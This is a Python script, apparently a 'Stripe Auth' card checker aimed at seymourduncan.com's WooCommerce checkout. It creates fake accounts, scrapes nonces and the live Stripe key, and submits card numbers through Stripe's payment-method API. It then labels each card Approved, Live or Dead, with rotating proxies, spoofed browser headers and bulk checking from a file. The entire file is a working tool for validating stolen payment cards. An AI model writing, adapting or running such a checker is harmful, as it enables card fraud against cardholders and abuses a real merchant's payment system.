"""
Seymour Duncan Stripe Auth Gateway
Based on HTTP traffic from apiii (seymourduncan.com)
WooCommerce + woo-stripe-payment plugin v3.3.105
Self-contained
"""

import requests
import random
import uuid
import re
import time
import sys
import os
from urllib.parse import urlparse
from bs4 import BeautifulSoup

# Colors
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'


class SeymourDuncanGateway:
    """Seymour Duncan Stripe Auth Gateway"""

    def __init__(self):
        self.name = "Seymour Duncan"
        self.session = requests.Session()
        self.proxy_sources = []
        self.proxy_pool = []
        self.proxy_loaded_at = 0
        self.proxy_ttl = int(os.getenv("PROXY_TTL", "300"))
        self.socks_supported = self._check_socks_support()
        self.proxy_required = os.getenv("PROXY_REQUIRED", "1").strip() not in {"0", "false", "no", "off"}

    def _check_socks_support(self):
        try:
            import socks  # type: ignore
            return True
        except Exception:
            return False

    def generate_random_data(self):
        first_names = ["John", "Sarah", "Michael", "Emma", "James", "Olivia", "William", "Ava", "David", "Sophia"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        first = random.choice(first_names)
        last = random.choice(last_names)
        email = f"{first.lower()}.{last.lower()}{random.randint(100, 999)}@gmail.com"
        return {'first_name': first, 'last_name': last, 'email': email, 'uuid': str(uuid.uuid4())}

    def generate_user_agent(self):
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
        ]
        return random.choice(agents)

    def load_proxy_sources(self):
        if self.proxy_sources:
            return
        source_file = os.path.join(os.path.dirname(__file__), "proxy source.txt")
        try:
            with open(source_file, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if line.upper() in {"SOCKS5", "SOCKS4", "HTTP", "HTTPS"}:
                        continue
                    self.proxy_sources.append(line)
        except FileNotFoundError:
            self.proxy_sources = []
        except Exception:
            self.proxy_sources = []

    def normalize_proxy_string(self, proxy_line):
        proxy_line = proxy_line.strip()
        if not proxy_line or proxy_line.startswith("#"):
            return None
        if proxy_line.upper() in {"SOCKS5", "SOCKS4", "HTTP", "HTTPS"}:
            return None

        proxy_line = re.sub(r"\s+", "", proxy_line)

        if "@" in proxy_line and ":" not in proxy_line.split("@")[-1]:
            return None

        if "://" not in proxy_line:
            proxy_line = f"http://{proxy_line}"

        parsed = urlparse(proxy_line)
        if not parsed.hostname or not parsed.port:
            return None

        scheme = parsed.scheme.lower()
        if scheme in {"socks4", "socks5"} and not self.socks_supported:
            return None

        if scheme in {"socks4", "socks5"} and self.socks_supported:
            proxy_url = proxy_line
            if scheme == "socks5":
                proxy_url = proxy_line.replace("socks5://", "socks5h://") if "socks5h://" not in proxy_line else proxy_line
            return proxy_url

        if scheme not in {"http", "https", "socks4", "socks5", "socks5h", "socks4a"}:
            return None

        return proxy_line

    def fetch_proxy_list(self, source_url):
        try:
            r = requests.get(source_url, timeout=15)
            if r.status_code != 200:
                return []
            proxies = []
            for line in r.text.splitlines():
                proxy = self.normalize_proxy_string(line)
                if proxy:
                    proxies.append(proxy)
            return proxies
        except Exception:
            return []

    def refresh_proxy_pool(self):
        if time.time() - self.proxy_loaded_at < self.proxy_ttl and self.proxy_pool:
            return
        self.load_proxy_sources()
        pool = []
        for source in self.proxy_sources:
            pool.extend(self.fetch_proxy_list(source))
        pool = [p for p in pool if p]
        random.shuffle(pool)
        self.proxy_pool = pool
        self.proxy_loaded_at = time.time()

    def get_random_proxy(self):
        self.refresh_proxy_pool()
        if not self.proxy_pool:
            return None
        proxy = random.choice(self.proxy_pool)
        scheme = urlparse(proxy).scheme.lower()
        if scheme in {"http", "https"}:
            return {"http": proxy, "https": proxy}
        if scheme.startswith("socks"):
            return {"http": proxy, "https": proxy}
        return None

    def check_card(self, card_str=None, number=None, month=None, year=None, cvv=None, **kwargs):
        """
        Full Stripe Auth check against seymourduncan.com
        Uses woo-stripe-payment plugin (form POST to add-payment-method)
        """
        start_time = time.time()

        # Parse card input
        if card_str and isinstance(card_str, str):
            parts = card_str.strip().split("|")
            if len(parts) < 4:
                return {'success': False, 'status': 'Invalid', 'message': 'Invalid format. Use: number|month|year|cvv', 'response': 'Invalid format', 'time': 0, 'gateway': self.name}
            card_number, exp_month, exp_year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            if len(exp_year) == 4: exp_year = exp_year[2:]
        elif isinstance(number, dict):
            card_number = number.get('number'); exp_month = number.get('month'); exp_year = number.get('year'); cvv = number.get('cvv')
        else:
            card_number, exp_month, exp_year, cvv = number, month, year, cvv
            if exp_year and len(str(exp_year)) == 4: exp_year = str(exp_year)[2:]

        if not all([card_number, exp_month, exp_year, cvv]):
            return {'success': False, 'status': 'Invalid', 'message': 'Missing card details', 'response': 'Missing details', 'time': 0, 'gateway': self.name}

        try:
            card_number = str(card_number).strip()
            exp_month = str(exp_month).strip().zfill(2)
            exp_year = str(exp_year).strip()
            cvv = str(cvv).strip()

            user_data = self.generate_random_data()
            uu = self.generate_user_agent()
            ui = str(uuid.uuid4())
            Host = 'www.seymourduncan.com'
            ses = requests.Session()  # Fresh session for every request!
            proxy = self.get_random_proxy()
            if not proxy and self.proxy_required:
                return {
                    'success': False,
                    'status': 'ProxyError',
                    'message': 'No working proxy available',
                    'response': 'Proxy required',
                    'time': round(time.time() - start_time, 2),
                    'gateway': self.name
                }
            if proxy:
                ses.proxies.update(proxy)
            mail = user_data['email']

            # ===== STEP 1: GET PAGE + EXTRACT REGISTER NONCE =====
            url = f"https://{Host}/my-account/add-payment-method"
            h1 = {
                'User-Agent': uu,
                'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                'Accept-Language': 'en-US,en;q=0.9',
                'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
                'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
            }

            r1 = ses.get(url, headers=h1, timeout=15)
            r1_text = r1.text

            tok = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', r1_text)
            token = tok.group(1) if tok else None
            if not token:
                soup = BeautifulSoup(r1_text, "html.parser")
                ts = soup.find("input", {"name": "woocommerce-register-nonce"})
                token = ts["value"] if ts else None
            if not token:
                return {'success': False, 'status': 'Error', 'message': 'Failed to get registration token', 'response': 'Registration Token Error', 'time': round(time.time() - start_time, 2), 'gateway': self.name}

            # ===== STEP 2: REGISTER ACCOUNT =====
            p1 = {
                'email': mail,
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': f"https://{Host}/my-account/add-payment-method",
                'wc_order_attribution_session_start_time': time.strftime('%Y-%m-%d %H:%M:%S'),
                'wc_order_attribution_session_pages': '1',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': uu,
                'woocommerce-register-nonce': token,
                '_wp_http_referer': '/my-account/add-payment-method',
                'register': 'Register'
            }
            ses.post(url, data=p1, headers=h1, timeout=15, allow_redirects=True)
            session_cookies = "; ".join([f"{c.name}={c.value}" for c in ses.cookies])

            # ===== STEP 3: GET AUTHENTICATED PAYMENT METHOD PAGE =====
            h2 = {
                'User-Agent': uu,
                'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'max-age=0',
                'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
                'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
                'Referer': f"https://{Host}/my-account/add-payment-method",
                'Cookie': session_cookies
            }
            r3 = ses.get(url, headers=h2, timeout=15)
            r3_text = r3.text

            # ===== STEP 4: EXTRACT STRIPE KEYS =====
            pk_match = re.search(r'(pk_live_[A-Za-z0-9]+)', r3_text)
            if not pk_match:
                return {'success': False, 'status': 'Error', 'message': 'Failed to extract Stripe publishable key', 'response': 'Stripe PK Error', 'time': round(time.time() - start_time, 2), 'gateway': self.name}
            akey = pk_match.group(0)

            acct_matches = re.findall(r'(acct_[a-zA-Z0-9]{10,})', r3_text)
            acid = acct_matches[0] if acct_matches else f'acct_{uuid.uuid4().hex[:20]}'

            # Extract the ADD PAYMENT METHOD nonce (used in the form POST)
            nonce_input = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', r3_text)
            if not nonce_input:
                return {'success': False, 'status': 'Error', 'message': 'Failed to extract payment method nonce', 'response': 'PM Nonce Error', 'time': round(time.time() - start_time, 2), 'gateway': self.name}
            pm_nonce = nonce_input.group(1)

            # Extract wp_http_referer from the form
            ref_match = re.search(r'name="_wp_http_referer" value="([^"]*)"', r3_text)
            wp_ref = ref_match.group(1) if ref_match else '/my-account/add-payment-method'

            # ===== STEP 5: CREATE PAYMENT METHOD VIA STRIPE API =====
            fac_payload = {
                'type': 'card',
                'card[number]': card_number,
                'card[cvc]': cvv,
                'card[exp_year]': exp_year,
                'card[exp_month]': exp_month,
                'billing_details[address][postal_code]': '93101',
                'billing_details[address][country]': 'US',
                'allow_redisplay': 'unspecified',
                'payment_user_agent': 'stripe.js/8702d4c73a; stripe-js-v3/8702d4c73a; payment-element; deferred-intent',
                'referrer': f"https://{Host}/my-account/add-payment-method",
                'time_on_page': str(int(time.time()) - random.randint(100, 1000)),
                'client_attribution_metadata[client_session_id]': ui,
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'guid': ui, 'muid': ui, 'sid': ui,
                'key': akey,
                '_stripe_account': acid
            }
            fax_headers = {
                'User-Agent': uu,
                'Accept': 'application/json',
                'Origin': 'https://js.stripe.com',
                'Referer': 'https://js.stripe.com/',
            }
            r4 = ses.post('https://api.stripe.com/v1/payment_methods', data=fac_payload, headers=fax_headers, timeout=15)
            r4_json = r4.json()

            if "error" in r4_json:
                error_msg = r4_json["error"].get("message", "Unknown error")
                error_code = r4_json["error"].get("code", "")
                if error_code in ["incorrect_cvc", "invalid_cvc"]:
                    return {'success': True, 'status': 'Live', 'message': f'CVC Issue (Live) - {error_msg}', 'response': error_msg, 'time': round(time.time() - start_time, 2), 'gateway': self.name}
                return {'success': False, 'status': 'Error', 'message': f'Stripe error: {error_msg}', 'response': error_msg, 'time': round(time.time() - start_time, 2), 'gateway': self.name}

            pm_id = r4_json.get("id")
            if not pm_id:
                return {'success': False, 'status': 'Error', 'message': 'No PM ID from Stripe', 'response': 'PM Missing', 'time': round(time.time() - start_time, 2), 'gateway': self.name}

            # ===== STEP 6: SUBMIT THE ADD PAYMENT METHOD FORM =====
            # This is the KEY step - woo-stripe-payment plugin submits a regular POST
            # with the stripe_cc_token_key set to the payment method ID
            form_data = {
                'stripe_cc_token_key': pm_id,
                'stripe_cc_payment_intent_key': '',
                'woocommerce-add-payment-method-nonce': pm_nonce,
                '_wp_http_referer': wp_ref,
                'woocommerce_add_payment_method': '1'
            }

            h_form = {
                'User-Agent': uu,
                'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': f"https://{Host}",
                'Referer': f"https://{Host}/my-account/add-payment-method",
                'Upgrade-Insecure-Requests': '1',
                'Cookie': session_cookies
            }

            # First try: POST the form directly (this is how the browser does it)
            r5 = ses.post(url, data=form_data, headers=h_form, timeout=15, allow_redirects=True)

            # ===== STEP 7: ANALYZE RESULT =====
            r5_text = r5.text
            elapsed_time = round(time.time() - start_time, 2)

            # The plugin will redirect to /my-account/payment-methods on success
            # or show error messages on the same page
            
            # Check for success indicators
            redirected = 'payment-methods' in r5.url and 'add-payment-method' not in r5.url
            added_msg = 'Payment method successfully added' in r5_text
            success_method = 'Added' in r5_text or 'successfully' in r5_text.lower() or 'success' in r5_text.lower()
            
            # Check for decline indicators
            declined = 'Your card was declined.' in r5_text
            cvc_issue = "Your card's security code is incorrect" in r5_text
            insufficient = "insufficient_funds" in r5_text.lower() or "Insufficient" in r5_text
            cannot_setup = "Your card could not be set up for future usage" in r5_text
            incorrect_number = "Your card number is incorrect." in r5_text
            
            # Check Stripe error messages in the response
            stripe_decline = 'card_declined' in r5_text
            stripe_insufficient = 'insufficient_funds' in r5_text
            
            # Also check the Stripe setup intent via REST API
            # The plugin uses: /?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent
            # This is called client-side by JS, but the form POST result has the outcome
            
            # Check for error notices
            error_notices = re.findall(r'class="woocommerce-error"[^>]*>(.*?)</ul>', r5_text, re.DOTALL)
            error_msgs = []
            for notice in error_notices:
                items = re.findall(r'<li>(.*?)</li>', notice, re.DOTALL)
                error_msgs.extend(items)
            
            # Build message
            if declined or stripe_decline:
                msg = "Your card was declined."
                return {'success': False, 'status': 'Declined', 'message': f'Dead Card - {msg}', 'response': msg, 'time': elapsed_time, 'gateway': self.name}
            elif cvc_issue:
                msg = "Your card's security code is incorrect"
                return {'success': True, 'status': 'Live', 'message': f'CVV Mismatch (Live) - {msg}', 'response': msg, 'time': elapsed_time, 'gateway': self.name}
            elif insufficient or stripe_insufficient:
                msg = "Insufficient funds"
                return {'success': True, 'status': 'Live', 'message': f'Low Fund (Live) - {msg}', 'response': msg, 'time': elapsed_time, 'gateway': self.name}
            elif redirected or added_msg or success_method:
                msg = "Payment method successfully added"
                return {'success': True, 'status': 'Approved', 'message': f'{msg}', 'response': msg, 'time': elapsed_time, 'gateway': self.name}
            elif cannot_setup:
                msg = "Your card could not be set up for future usage"
                return {'success': False, 'status': 'Declined', 'message': f'{msg}', 'response': msg, 'time': elapsed_time, 'gateway': self.name}
            elif error_msgs:
                # Extract meaningful error
                for em in error_msgs:
                    if 'declined' in em.lower():
                        return {'success': False, 'status': 'Declined', 'message': f'Dead Card - {em.strip()}', 'response': em.strip(), 'time': elapsed_time, 'gateway': self.name}
                    if 'cvc' in em.lower() or 'security code' in em.lower():
                        return {'success': True, 'status': 'Live', 'message': f'CVV Issue (Live) - {em.strip()}', 'response': em.strip(), 'time': elapsed_time, 'gateway': self.name}
                msg = error_msgs[0].strip()
            else:
                msg = r5_text[:200]

            return {'success': False, 'status': 'Unknown', 'message': msg[:200], 'response': msg[:200], 'time': elapsed_time, 'gateway': self.name}

        except requests.exceptions.Timeout:
            return {'success': False, 'status': 'Error', 'message': 'Request timeout', 'response': 'Timeout', 'time': round(time.time() - start_time, 2), 'gateway': self.name}
        except Exception as e:
            import traceback
            return {'success': False, 'status': 'Error', 'message': f'Exception: {str(e)[:150]}', 'response': traceback.format_exc()[:300], 'time': round(time.time() - start_time, 2), 'gateway': self.name}


def print_result(card_str, result):
    if result.get('success', False):
        if result.get('status') == 'Approved':
            print(f"{GREEN}{card_str} >> APPROVED - {result['message']} {RESET}")
        elif result.get('status') == 'Live':
            print(f"{YELLOW}{card_str} >> LIVE - {result['message']}{RESET}")
        else:
            print(f"{GREEN}{card_str} >> {result['status']} - {result['message']}{RESET}")
    else:
        color = YELLOW if result.get('status') == 'Declined' else RED
        print(f"{color}{card_str} >> {result['status']} - {result['message']}{RESET}")


def single_check(gateway):
    card = input("Enter card (format: number|month|year|cvv): ").strip()
    if not card: return
    print(f"\n{CYAN}Checking: {card}{RESET}")
    result = gateway.check_card(card_str=card)
    print_result(card, result)
    print(f"  Time: {result.get('time', 0)}s")


def file_check(gateway):
    path = input("Enter file path: ").strip()
    if not os.path.isfile(path):
        print("File not found.")
        return
    with open(path, 'r') as f:
        cards = [line.strip() for line in f if line.strip()]
    total = len(cards)
    approved = live = declined = errors = 0
    print(f"\n{CYAN}Loaded {total} cards{RESET}\n")
    for i, card in enumerate(cards, 1):
        print(f"[{i}/{total}] ", end="")
        result = gateway.check_card(card_str=card)
        print_result(card, result)
        if result.get('success'):
            if result.get('status') == 'Approved': approved += 1
            elif result.get('status') == 'Live': live += 1
        else:
            if result.get('status') == 'Declined': declined += 1
            else: errors += 1
    print(f"\n{'='*50}\n{CYAN}SUMMARY{RESET}\n{'='*50}")
    print(f"  Total: {total} | {GREEN}Approved: {approved}{RESET} | {YELLOW}Live: {live}{RESET} | {RED}Declined: {declined} | Errors: {errors}{RESET}")


def main():
    gateway = SeymourDuncanGateway()
    print(f"{CYAN}{'='*50}{RESET}")
    print(f"{CYAN}  SEYMOUR DUNCAN - Stripe Auth Checker{RESET}")
    print(f"{CYAN}  Target: www.seymourduncan.com{RESET}")
    print(f"{CYAN}{'='*50}{RESET}")
    while True:
        print("\n1. Check Single Card\n2. Check Cards from File\n3. Exit")
        choice = input("Choose: ").strip()
        if choice == '1': single_check(gateway)
        elif choice == '2': file_check(gateway)
        elif choice == '3': print("Exiting..."); break
        else: print("Invalid choice.")


if __name__ == "__main__":
    main()